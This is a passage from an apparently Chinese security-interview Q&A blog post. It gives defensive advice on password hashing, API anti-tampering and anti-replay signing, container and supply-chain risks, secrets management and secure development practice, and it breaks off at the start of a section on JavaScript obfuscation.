使用密钥推导函数：   - PBKDF2（基于 HMAC 的密钥派生）：        - bcrypt（适用于 Web 应用）：        - scrypt（适用于高安全场景）：     4. 避免明文存储：   - 严禁存储明文密码，所有密码必须经过安全哈希处理。"></a><strong>密码存储最佳实践</strong>：<br>1. <strong>使用强哈希算法</strong>：<br>   - 推荐使用 <strong>PBKDF2</strong>、<strong>bcrypt</strong> 或 <strong>scrypt</strong>，避免使用 MD5、SHA1、SHA256 直接存储。<br>2. <strong>添加随机盐（Salt）</strong>：<br>   - 解决 <strong>彩虹表攻击</strong>，确保相同密码哈希值不同。<br>3. <strong>使用密钥推导函数</strong>：<br>   - <strong>PBKDF2</strong>（基于 HMAC 的密钥派生）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure><br>   - <strong>bcrypt</strong>（适用于 Web 应用）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> gensalt, hashpw</span><br><span class="line">hashed = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure><br>   - <strong>scrypt</strong>（适用于高安全场景）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hashed = hashlib.scrypt(password.encode(), salt=os.urandom(<span class="number">16</span>), n=<span class="number">16384</span>, r=<span class="number">8</span>, p=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br>4. <strong>避免明文存储</strong>：<br>   - 严禁存储明文密码，所有密码必须经过安全哈希处理。</h2><h4 id="某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？"><a href="#某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？" class="headerlink" title="某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？"></a><strong>某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</strong></h4><p><strong>常见风险</strong>：</p><ol><li><p><strong>登录</strong>：</p><ul><li><strong>暴力破解</strong>：攻击者不断尝试用户名密码组合。</li><li><strong>凭证泄露</strong>：弱密码或数据库泄露导致账号被盗。</li><li><strong>会话固定攻击</strong>：攻击者利用固定 Session ID 劫持用户身份。</li></ul></li><li><p><strong>注册</strong>：</p><ul><li><strong>自动化注册</strong>：攻击者批量注册垃圾账号（如 CAPTCHA 绕过）。</li><li><strong>手机号&#x2F;邮箱占用</strong>：利用他人信息恶意占号。</li></ul></li><li><p><strong>修改密码</strong>：</p><ul><li><strong>未验证原密码</strong>：直接允许修改密码，导致账号被盗。</li><li><strong>邮件链接劫持</strong>：重置密码链接未使用一次性 Token，容易被劫持。</li></ul></li><li><p><strong>支付</strong>：</p><ul><li><strong>金额篡改</strong>：客户端数据未加签，攻击者可篡改支付金额。</li><li><strong>订单重放</strong>：未加随机数的请求被重复提交，造成资金损失。</li></ul></li></ol><h2 id="防范措施：-登录：使用验证码、IP-频率限制、二次验证（2FA）。-注册：限制批量注册（如基于行为分析检测）。-修改密码：要求输入旧密码，或进行二次验证（短信-邮件）。-支付：使用-HMAC-签名，防止请求篡改，启用-幂等机制-避免重复支付。"><a href="#防范措施：-登录：使用验证码、IP-频率限制、二次验证（2FA）。-注册：限制批量注册（如基于行为分析检测）。-修改密码：要求输入旧密码，或进行二次验证（短信-邮件）。-支付：使用-HMAC-签名，防止请求篡改，启用-幂等机制-避免重复支付。" class="headerlink" title="防范措施：- 登录：使用验证码、IP 频率限制、二次验证（2FA）。- 注册：限制批量注册（如基于行为分析检测）。- 修改密码：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。- 支付：使用 HMAC 签名，防止请求篡改，启用 幂等机制 避免重复支付。"></a><strong>防范措施</strong>：<br>- <strong>登录</strong>：使用验证码、IP 频率限制、二次验证（2FA）。<br>- <strong>注册</strong>：限制批量注册（如基于行为分析检测）。<br>- <strong>修改密码</strong>：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。<br>- <strong>支付</strong>：使用 <strong>HMAC 签名</strong>，防止请求篡改，启用 <strong>幂等机制</strong> 避免重复支付。</h2><h4 id="新应用如何评估安全风险？"><a href="#新应用如何评估安全风险？" class="headerlink" title="新应用如何评估安全风险？"></a><strong>新应用如何评估安全风险？</strong></h4><h2 id="评估方法：1-攻击面分析：-识别-API、前端、数据库、第三方集成的潜在漏洞点。2-身份认证与访问控制：-确保使用-JWT、OAuth-进行身份认证，避免越权访问。3-数据保护：-敏感数据加密存储，防止数据泄露。4-业务逻辑漏洞：-评估支付、交易等关键功能，防止恶意利用。"><a href="#评估方法：1-攻击面分析：-识别-API、前端、数据库、第三方集成的潜在漏洞点。2-身份认证与访问控制：-确保使用-JWT、OAuth-进行身份认证，避免越权访问。3-数据保护：-敏感数据加密存储，防止数据泄露。4-业务逻辑漏洞：-评估支付、交易等关键功能，防止恶意利用。" class="headerlink" title="评估方法：1. 攻击面分析：   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。2. 身份认证与访问控制：   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。3. 数据保护：   - 敏感数据加密存储，防止数据泄露。4. 业务逻辑漏洞：   - 评估支付、交易等关键功能，防止恶意利用。"></a><strong>评估方法</strong>：<br>1. <strong>攻击面分析</strong>：<br>   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。<br>2. <strong>身份认证与访问控制</strong>：<br>   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。<br>3. <strong>数据保护</strong>：<br>   - 敏感数据加密存储，防止数据泄露。<br>4. <strong>业务逻辑漏洞</strong>：<br>   - 评估支付、交易等关键功能，防止恶意利用。</h2><h4 id="需求阶段、各分阶段安全评估的侧重点是什么？"><a href="#需求阶段、各分阶段安全评估的侧重点是什么？" class="headerlink" title="需求阶段、各分阶段安全评估的侧重点是什么？"></a><strong>需求阶段、各分阶段安全评估的侧重点是什么？</strong></h4><p><strong>不同阶段的安全评估重点</strong>：</p><ol><li><p><strong>需求阶段</strong>：</p><ul><li>识别业务逻辑中的潜在安全风险，如支付流程、权限管理等。</li><li>确保合规性（GDPR、PCI DSS 等）。</li></ul></li><li><p><strong>设计阶段</strong>：</p><ul><li>采用 <strong>最小权限原则</strong> 设计访问控制。</li><li>评估加密方案，防止数据泄露。</li></ul></li><li><p><strong>开发阶段</strong>：</p><ul><li>代码审计（SAST），检查 XSS、SQL 注入等漏洞。</li><li>代码安全规范（禁止硬编码密钥等）。</li></ul></li><li><p><strong>测试阶段</strong>：</p><ul><li>进行黑盒测试（DAST），模拟攻击者视角查找漏洞。</li></ul></li><li><p><strong>上线后</strong>：</p><ul><li>启用 <strong>入侵检测系统（IDS）</strong>，监控异常行为。</li><li>定期漏洞扫描，防止安全回归。</li></ul></li></ol><hr><h4 id="接口-B-的参数是从接口-A-的响应中获取的，会存在哪些风险？"><a href="#接口-B-的参数是从接口-A-的响应中获取的，会存在哪些风险？" class="headerlink" title="接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？"></a><strong>接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？</strong></h4><p><strong>常见风险</strong>：</p><ul><li><strong>信任链问题</strong>：接口 A 的数据未经校验直接传递给接口 B，导致漏洞传播。</li><li><strong>数据篡改</strong>：如果攻击者能劫持接口 A 响应，可伪造数据影响接口 B。</li><li><strong>请求伪造</strong>：如果接口 A 返回可被滥用的 URL，攻击者可构造恶意请求。</li></ul><h2 id="防范措施：-数据完整性校验：接口-A-的响应必须进行签名验证。-限制数据来源：接口-B-仅接受可信-API-的数据。-使用-Token-关联请求，防止数据篡改。"><a href="#防范措施：-数据完整性校验：接口-A-的响应必须进行签名验证。-限制数据来源：接口-B-仅接受可信-API-的数据。-使用-Token-关联请求，防止数据篡改。" class="headerlink" title="防范措施：- 数据完整性校验：接口 A 的响应必须进行签名验证。- 限制数据来源：接口 B 仅接受可信 API 的数据。- 使用 Token 关联请求，防止数据篡改。"></a><strong>防范措施</strong>：<br>- <strong>数据完整性校验</strong>：接口 A 的响应必须进行签名验证。<br>- <strong>限制数据来源</strong>：接口 B 仅接受可信 API 的数据。<br>- <strong>使用 Token 关联请求</strong>，防止数据篡改。</h2><h4 id="新的-API-接口上线时，如何设计使其避免出现请求篡改和请求重放？"><a href="#新的-API-接口上线时，如何设计使其避免出现请求篡改和请求重放？" class="headerlink" title="新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？"></a><strong>新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？</strong></h4><p><strong>防篡改措施</strong>：</p><ul><li><strong>参数签名</strong>：<ul><li>使用 <strong>HMAC-SHA256</strong> 计算请求参数签名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac, hashlib</span><br><span class="line">secret = <span class="string">b&#x27;secret-key&#x27;</span></span><br><span class="line">message = <span class="string">b&#x27;param1=value1&amp;param2=value2&#x27;</span></span><br><span class="line">signature = hmac.new(secret, message, hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure></li><li>服务器端校验签名，防止参数被篡改。</li></ul></li></ul><h2 id="防重放措施：-使用时间戳-随机数：-在请求中添加-timestamp-nonce，确保唯一性：-服务器端存储已使用的-nonce，防止重复请求。"><a href="#防重放措施：-使用时间戳-随机数：-在请求中添加-timestamp-nonce，确保唯一性：-服务器端存储已使用的-nonce，防止重复请求。" class="headerlink" title="防重放措施：- 使用时间戳+随机数：  - 在请求中添加 timestamp + nonce，确保唯一性：      - 服务器端存储已使用的 nonce，防止重复请求。"></a><strong>防重放措施</strong>：<br>- <strong>使用时间戳+随机数</strong>：<br>  - 在请求中添加 <code>timestamp</code> + <code>nonce</code>，确保唯一性：<br>    <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>  - 服务器端存储已使用的 <code>nonce</code>，防止重复请求。</h2><h4 id="Docker-容器以及-K8s-有哪些风险？"><a href="#Docker-容器以及-K8s-有哪些风险？" class="headerlink" title="Docker 容器以及 K8s 有哪些风险？"></a><strong>Docker 容器以及 K8s 有哪些风险？</strong></h4><p><strong>Docker 风险</strong>：</p><ul><li><strong>容器逃逸</strong>：攻击者可利用 <strong>CVE-2019-5736</strong> 等漏洞获取宿主机权限。</li><li><strong>不安全镜像</strong>：使用来源不明的镜像，可能带后门或恶意代码。</li><li><strong>权限提升</strong>：容器运行时使用 <code>--privileged</code> 选项，导致权限过高。</li></ul><p><strong>K8s 风险</strong>：</p><ul><li><strong>API 滥用</strong>：K8s API 未授权访问，导致敏感数据泄露。</li><li><strong>RBAC 配置错误</strong>：错误的角色绑定（如 <code>cluster-admin</code>）导致权限扩大。</li><li><strong>未隔离命名空间</strong>：多个应用共享命名空间，增加攻击面。</li></ul><h2 id="防范措施：-使用-最小权限原则-限制容器和-K8s-资源访问。-启用-Pod-Security-Policy，避免运行高权限容器。-定期扫描容器镜像，防止供应链攻击。"><a href="#防范措施：-使用-最小权限原则-限制容器和-K8s-资源访问。-启用-Pod-Security-Policy，避免运行高权限容器。-定期扫描容器镜像，防止供应链攻击。" class="headerlink" title="防范措施：- 使用 最小权限原则 限制容器和 K8s 资源访问。- 启用 Pod Security Policy，避免运行高权限容器。- 定期扫描容器镜像，防止供应链攻击。"></a><strong>防范措施</strong>：<br>- 使用 <strong>最小权限原则</strong> 限制容器和 K8s 资源访问。<br>- 启用 <strong>Pod Security Policy</strong>，避免运行高权限容器。<br>- 定期扫描容器镜像，防止供应链攻击。</h2><h4 id="IPv6-和-IPv4-安全差异？"><a href="#IPv6-和-IPv4-安全差异？" class="headerlink" title="IPv6 和 IPv4 安全差异？"></a><strong>IPv6 和 IPv4 安全差异？</strong></h4><p><strong>主要安全差异</strong>：</p><ol><li><strong>地址可用性</strong>：<ul><li>IPv6 地址空间更大，不再依赖 NAT 进行地址复用，但暴露面更大。</li></ul></li><li><strong>默认启用 ICMPv6</strong>：<ul><li>攻击者可利用 <strong>ICMPv6 邻居发现协议</strong> 发起 MITM 攻击。</li></ul></li><li><strong>无状态地址自动配置（SLAAC）</strong>：<ul><li>设备可自动分配 IPv6 地址，可能被恶意利用进行伪造。</li></ul></li></ol><h2 id="防范措施：-限制-IPv6-访问范围，使用防火墙规则拦截外部未授权流量。-启用-RA-Guard，防止恶意-IPv6-路由公告。"><a href="#防范措施：-限制-IPv6-访问范围，使用防火墙规则拦截外部未授权流量。-启用-RA-Guard，防止恶意-IPv6-路由公告。" class="headerlink" title="防范措施：- 限制 IPv6 访问范围，使用防火墙规则拦截外部未授权流量。- 启用 RA-Guard，防止恶意 IPv6 路由公告。"></a><strong>防范措施</strong>：<br>- <strong>限制 IPv6 访问范围</strong>，使用防火墙规则拦截外部未授权流量。<br>- <strong>启用 RA-Guard</strong>，防止恶意 IPv6 路由公告。</h2><h4 id="三方引入的应用和自研应用评估的差异有哪些？"><a href="#三方引入的应用和自研应用评估的差异有哪些？" class="headerlink" title="三方引入的应用和自研应用评估的差异有哪些？"></a><strong>三方引入的应用和自研应用评估的差异有哪些？</strong></h4><p><strong>三方应用评估</strong>：</p><ul><li>主要关注 <strong>供应链攻击</strong>，检查是否存在恶意代码或后门。</li><li>需要 <strong>代码审计</strong>，避免第三方 SDK 泄露数据。</li></ul><h2 id="自研应用评估：-重点关注-业务逻辑漏洞（如支付绕过、权限越权）。-代码安全规范需严格执行，防止内部泄露风险。"><a href="#自研应用评估：-重点关注-业务逻辑漏洞（如支付绕过、权限越权）。-代码安全规范需严格执行，防止内部泄露风险。" class="headerlink" title="自研应用评估：- 重点关注 业务逻辑漏洞（如支付绕过、权限越权）。- 代码安全规范需严格执行，防止内部泄露风险。"></a><strong>自研应用评估</strong>：<br>- 重点关注 <strong>业务逻辑漏洞</strong>（如支付绕过、权限越权）。<br>- 代码安全规范需严格执行，防止内部泄露风险。</h2><h4 id="金融业务有何特性？"><a href="#金融业务有何特性？" class="headerlink" title="金融业务有何特性？"></a><strong>金融业务有何特性？</strong></h4><ol><li><strong>高安全性</strong>：<ul><li>需符合 <strong>PCI DSS</strong>、GDPR 等合规要求。</li></ul></li><li><strong>强身份认证</strong>：<ul><li>使用 <strong>多因子认证（MFA）</strong>，防止账户被盗。</li></ul></li><li><strong>交易不可抵赖性</strong>：<ul><li>采用 <strong>数字签名</strong> 保障交易真实性。</li></ul></li></ol><hr><h4 id="mvn-源的安全性需要考虑哪些点？"><a href="#mvn-源的安全性需要考虑哪些点？" class="headerlink" title="mvn 源的安全性需要考虑哪些点？"></a><strong>mvn 源的安全性需要考虑哪些点？</strong></h4><ul><li><strong>防止供应链攻击</strong>：<ul><li>使用可信 Maven 仓库（如 Maven Central）。</li></ul></li><li><strong>依赖包完整性</strong>：<ul><li>启用 SHA256 校验：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">checksumPolicy</span>&gt;</span>fail<span class="tag">&lt;/<span class="name">checksumPolicy</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h4 id="如何让业务方主动找你评估？"><a href="#如何让业务方主动找你评估？" class="headerlink" title="如何让业务方主动找你评估？"></a><strong>如何让业务方主动找你评估？</strong></h4><ol><li><strong>建立安全反馈机制</strong>：<ul><li>设立安全邮箱，鼓励业务团队主动提交评估请求。</li></ul></li><li><strong>安全培训</strong>：<ul><li>提供 <strong>安全开发培训</strong>，提升业务团队的安全意识。</li></ul></li><li><strong>数据驱动决策</strong>：<ul><li>通过安全事件分析，展示安全风险对业务的影响，提高安全优先级。</li></ul></li></ol><h3 id="如何判断评估覆盖范围的优先级？"><a href="#如何判断评估覆盖范围的优先级？" class="headerlink" title="如何判断评估覆盖范围的优先级？"></a><strong>如何判断评估覆盖范围的优先级？</strong></h3><p><strong>优先级判断依据</strong>：</p><ol><li><strong>业务影响</strong>：<ul><li>关键业务（支付、身份认证、核心数据库）应优先评估。</li></ul></li><li><strong>攻击面大小</strong>：<ul><li>公开 API、Web 界面、第三方集成点风险较高，需优先测试。</li></ul></li><li><strong>历史安全事件</strong>：<ul><li>结合过往漏洞数据，优先排查高风险区域。</li></ul></li></ol><h2 id="最佳实践：-采用-攻击面分析（Attack-Surface-Analysis）-识别高风险区域。-结合-威胁建模-评估潜在威胁。"><a href="#最佳实践：-采用-攻击面分析（Attack-Surface-Analysis）-识别高风险区域。-结合-威胁建模-评估潜在威胁。" class="headerlink" title="最佳实践：- 采用 攻击面分析（Attack Surface Analysis） 识别高风险区域。- 结合 威胁建模 评估潜在威胁。"></a><strong>最佳实践</strong>：<br>- 采用 <strong>攻击面分析（Attack Surface Analysis）</strong> 识别高风险区域。<br>- 结合 <strong>威胁建模</strong> 评估潜在威胁。</h2><h3 id="如何系统提高安全评估效率？"><a href="#如何系统提高安全评估效率？" class="headerlink" title="如何系统提高安全评估效率？"></a><strong>如何系统提高安全评估效率？</strong></h3><p><strong>优化方法</strong>：</p><ol><li><strong>自动化测试</strong>：<ul><li>使用 SAST（静态代码分析）+ DAST（动态应用测试）提高漏洞发现速度。</li></ul></li><li><strong>CI&#x2F;CD 安全集成</strong>：<ul><li>在 DevOps 流程中嵌入安全测试，自动检测代码漏洞。</li></ul></li><li><strong>安全运营平台化</strong>：<ul><li>构建统一安全评估平台，集中管理资产、漏洞、测试结果。</li></ul></li></ol><h2 id="示例：-在-CI-CD-流程中集成-SonarQube-进行代码安全扫描。持续集成（CI）和持续部署（CD）流程-采用-Burp-Suite-自动化扫描-发现-Web-漏洞。"><a href="#示例：-在-CI-CD-流程中集成-SonarQube-进行代码安全扫描。持续集成（CI）和持续部署（CD）流程-采用-Burp-Suite-自动化扫描-发现-Web-漏洞。" class="headerlink" title="示例：- 在 CI&#x2F;CD 流程中集成 SonarQube 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程- 采用 Burp Suite 自动化扫描 发现 Web 漏洞。"></a><strong>示例</strong>：<br>- 在 CI&#x2F;CD 流程中集成 <strong>SonarQube</strong> 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程<br>- 采用 <strong>Burp Suite 自动化扫描</strong> 发现 Web 漏洞。</h2><h3 id="如何理解安全左移？"><a href="#如何理解安全左移？" class="headerlink" title="如何理解安全左移？"></a><strong>如何理解安全左移？</strong></h3><p><strong>概念</strong>：</p><ul><li><strong>安全左移（Shift Left Security）</strong> 指的是将安全评估前置到软件开发生命周期（SDLC）的早期阶段，而非仅在上线后检测漏洞。</li></ul><p><strong>关键实践</strong>：</p><ol><li><strong>在开发阶段进行代码安全审计</strong>（SAST）。</li><li><strong>CI&#x2F;CD 流程中集成安全扫描</strong>，避免上线后修复成本高。</li><li><strong>开发人员安全培训</strong>，提升安全意识。</li></ol><h2 id="示例：-在代码提交时运行-Checkmarx-进行静态代码分析。-在-Jenkins-Pipeline-中加入-OWASP-ZAP-自动化扫描。"><a href="#示例：-在代码提交时运行-Checkmarx-进行静态代码分析。-在-Jenkins-Pipeline-中加入-OWASP-ZAP-自动化扫描。" class="headerlink" title="示例：- 在代码提交时运行 Checkmarx 进行静态代码分析。- 在 Jenkins Pipeline 中加入 OWASP ZAP 自动化扫描。"></a><strong>示例</strong>：<br>- 在代码提交时运行 <strong>Checkmarx</strong> 进行静态代码分析。<br>- 在 Jenkins Pipeline 中加入 <strong>OWASP ZAP</strong> 自动化扫描。</h2><h3 id="安全评估的行业最佳实践是什么？"><a href="#安全评估的行业最佳实践是什么？" class="headerlink" title="安全评估的行业最佳实践是什么？"></a><strong>安全评估的行业最佳实践是什么？</strong></h3><ol><li><strong>威胁建模（Threat Modeling）</strong>：<ul><li>采用 STRIDE、DREAD 等方法预测攻击路径。</li></ul></li><li><strong>安全基线（Security Baseline）</strong>：<ul><li>参考 <strong>NIST、CIS、ISO 27001</strong> 建立安全标准。</li></ul></li><li><strong>零信任架构（Zero Trust Security）</strong>：<ul><li>任何访问请求都需经过严格身份验证和授权。</li></ul></li><li><strong>持续监测（Continuous Monitoring）</strong>：<ul><li>使用 <strong>SIEM（安全信息与事件管理）</strong> 实时检测异常行为。</li></ul></li></ol><p><strong>示例</strong>：</p><ul><li>企业安全框架参考 <strong>MITRE ATT&amp;CK</strong> 进行安全威胁建模。</li></ul><h3 id="硬编码密钥有何风险以及如何系统解决？"><a href="#硬编码密钥有何风险以及如何系统解决？" class="headerlink" title="硬编码密钥有何风险以及如何系统解决？"></a><strong>硬编码密钥有何风险以及如何系统解决？</strong></h3><p><strong>风险分析</strong>：</p><ol><li><p><strong>密钥暴露面大，攻击成本低</strong>：</p><ul><li>硬编码密钥易被泄露，<strong>GitHub、云盘、日志文件</strong> 都可能存储代码副本。</li><li>攻击者通过代码审计工具（如 TruffleHog、GitLeaks）扫描密钥。</li><li>泄露密钥后，攻击者可直接访问 API、数据库、云服务。</li></ul></li><li><p><strong>密钥难以更换</strong>：</p><ul><li>当密钥写死在代码中，变更成本大，需要重新部署应用。</li><li>攻击者可以长期利用泄露的密钥，造成持久性风险。</li></ul></li></ol><h2 id="解决方案：-使用环境变量存储密钥：-使用密钥管理系统（KMS）：-采用-AWS-KMS、HashiCorp-Vault-进行密钥管理，避免硬编码。-定期轮换密钥：-设定密钥-生命周期，定期生成新密钥，降低长期泄露风险。"><a href="#解决方案：-使用环境变量存储密钥：-使用密钥管理系统（KMS）：-采用-AWS-KMS、HashiCorp-Vault-进行密钥管理，避免硬编码。-定期轮换密钥：-设定密钥-生命周期，定期生成新密钥，降低长期泄露风险。" class="headerlink" title="解决方案：- 使用环境变量存储密钥：  - 使用密钥管理系统（KMS）：  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。- 定期轮换密钥：  - 设定密钥 生命周期，定期生成新密钥，降低长期泄露风险。"></a><strong>解决方案</strong>：<br>- <strong>使用环境变量存储密钥</strong>：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure><br>- <strong>使用密钥管理系统（KMS）</strong>：<br>  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。<br>- <strong>定期轮换密钥</strong>：<br>  - 设定密钥 <strong>生命周期</strong>，定期生成新密钥，降低长期泄露风险。</h2><h3 id="0day-漏洞如何防御？"><a href="#0day-漏洞如何防御？" class="headerlink" title="0day 漏洞如何防御？"></a><strong>0day 漏洞如何防御？</strong></h3><h2 id="防御策略：1-增强攻击面监控：-采用-威胁情报（Threat-Intelligence），订阅-CVE-预警信息。2-启用-RASP（运行时应用自我保护）：-通过-Hook-关键-API，检测异常行为，如-Java-RASP-监控-Runtime-exec-。3-加强访问控制：-限制高权限用户操作，如-SSH-访问、数据库管理权限。"><a href="#防御策略：1-增强攻击面监控：-采用-威胁情报（Threat-Intelligence），订阅-CVE-预警信息。2-启用-RASP（运行时应用自我保护）：-通过-Hook-关键-API，检测异常行为，如-Java-RASP-监控-Runtime-exec-。3-加强访问控制：-限制高权限用户操作，如-SSH-访问、数据库管理权限。" class="headerlink" title="防御策略：1. 增强攻击面监控：   - 采用 威胁情报（Threat Intelligence），订阅 CVE 预警信息。2. 启用 RASP（运行时应用自我保护）：   - 通过 Hook 关键 API，检测异常行为，如 Java RASP 监控 Runtime.exec()。3. 加强访问控制：   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。"></a><strong>防御策略</strong>：<br>1. <strong>增强攻击面监控</strong>：<br>   - 采用 <strong>威胁情报（Threat Intelligence）</strong>，订阅 CVE 预警信息。<br>2. <strong>启用 RASP（运行时应用自我保护）</strong>：<br>   - 通过 <strong>Hook 关键 API</strong>，检测异常行为，如 Java RASP 监控 <code>Runtime.exec()</code>。<br>3. <strong>加强访问控制</strong>：<br>   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。</h2><h4 id="GitHub-等三方泄漏敏感信息如何体系防御？"><a href="#GitHub-等三方泄漏敏感信息如何体系防御？" class="headerlink" title="GitHub 等三方泄漏敏感信息如何体系防御？"></a><strong>GitHub 等三方泄漏敏感信息如何体系防御？</strong></h4><h2 id="防御方法：1-自动化扫描：-使用-GitLeaks、TruffleHog-定期扫描-Git-仓库。2-强制-Git-Hook-检查：-在-Git-提交前检测敏感信息，防止误提交：-3-密钥失效机制：-一旦密钥泄露，立即使其失效并重新生成。"><a href="#防御方法：1-自动化扫描：-使用-GitLeaks、TruffleHog-定期扫描-Git-仓库。2-强制-Git-Hook-检查：-在-Git-提交前检测敏感信息，防止误提交：-3-密钥失效机制：-一旦密钥泄露，立即使其失效并重新生成。" class="headerlink" title="防御方法：1. 自动化扫描：   - 使用 GitLeaks、TruffleHog 定期扫描 Git 仓库。2. 强制 Git Hook 检查：   - 在 Git 提交前检测敏感信息，防止误提交：     3. 密钥失效机制：   - 一旦密钥泄露，立即使其失效并重新生成。"></a><strong>防御方法</strong>：<br>1. <strong>自动化扫描</strong>：<br>   - 使用 <strong>GitLeaks、TruffleHog</strong> 定期扫描 Git 仓库。<br>2. <strong>强制 Git Hook 检查</strong>：<br>   - 在 Git 提交前检测敏感信息，防止误提交：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre-commit run --all-files</span><br></pre></td></tr></table></figure><br>3. <strong>密钥失效机制</strong>：<br>   - 一旦密钥泄露，立即使其失效并重新生成。</h2><h3 id="业务逻辑漏洞如何通过技术手段挖掘与弥补？"><a href="#业务逻辑漏洞如何通过技术手段挖掘与弥补？" class="headerlink" title="业务逻辑漏洞如何通过技术手段挖掘与弥补？"></a><strong>业务逻辑漏洞如何通过技术手段挖掘与弥补？</strong></h3><p><strong>漏洞挖掘方法</strong>：</p><ol><li><strong>流量分析</strong>：<ul><li>通过 <strong>Burp Suite</strong> 捕获流量，分析参数可篡改性，如订单金额篡改。</li></ul></li><li><strong>Fuzzing（模糊测试）</strong>：<ul><li>对关键 API 进行输入变异测试，识别未处理的异常情况。</li></ul></li><li><strong>权限校验测试</strong>：<ul><li>使用低权限账户访问管理端 API，检查是否存在越权访问漏洞。</li></ul></li></ol><h2 id="修复策略：-后端强制权限校验，避免仅依赖前端限制。-启用幂等性检查，防止关键交易被重复执行。"><a href="#修复策略：-后端强制权限校验，避免仅依赖前端限制。-启用幂等性检查，防止关键交易被重复执行。" class="headerlink" title="修复策略：- 后端强制权限校验，避免仅依赖前端限制。- 启用幂等性检查，防止关键交易被重复执行。"></a><strong>修复策略</strong>：<br>- <strong>后端强制权限校验</strong>，避免仅依赖前端限制。<br>- <strong>启用幂等性检查</strong>，防止关键交易被重复执行。</h2><h3 id="软件供应链后门漏洞如何系统规避？"><a href="#软件供应链后门漏洞如何系统规避？" class="headerlink" title="软件供应链后门漏洞如何系统规避？"></a><strong>软件供应链后门漏洞如何系统规避？</strong></h3><p><strong>主要风险</strong>：</p><ul><li>供应链攻击可能通过 <strong>第三方库、开源组件</strong> 植入恶意代码，如 <strong>事件流（EventStream）后门</strong> 事件。</li></ul><p><strong>防范措施</strong>：</p><ol><li><strong>使用可信赖的软件仓库</strong>：<ul><li>采用 <strong>npm audit、pip check</strong> 等工具检测依赖漏洞。</li></ul></li><li><strong>启用 SCA（软件成分分析）</strong>：<ul><li>使用 <strong>Sonatype Nexus、Snyk</strong> 监测依赖安全性。</li></ul></li><li><strong>强制代码审计</strong>：<ul><li>采用 <strong>CodeQL</strong> 分析供应链代码，发现恶意代码片段。</li></ul></li></ol><h2 id="示例：使用-Snyk-扫描-Node-js-依赖："><a href="#示例：使用-Snyk-扫描-Node-js-依赖：" class="headerlink" title="示例：使用 Snyk 扫描 Node.js 依赖："></a><strong>示例：使用 Snyk 扫描 Node.js 依赖</strong>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snyk <span class="built_in">test</span></span><br></pre></td></tr></table></figure></h2><h3 id="前端-JavaScript-代码如何混淆以及反调试？"><a href="#前端-JavaScript-代码如何混淆以及反调试？" class="headerlink" title="前端 JavaScript 代码如何混淆以及反调试？"></a><strong>前端 JavaScript 代码如何混淆以及反调试？</strong></h3><p><strong>混淆技术</strong>：</p><ol><li><strong>代码结构打乱</strong>：<ul><li>插入无用代码，使逻辑难以阅读和分析。</li></ul></li><li><strong>变量名修改</strong>：<ul><li>将变量名替换为随机字符串：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 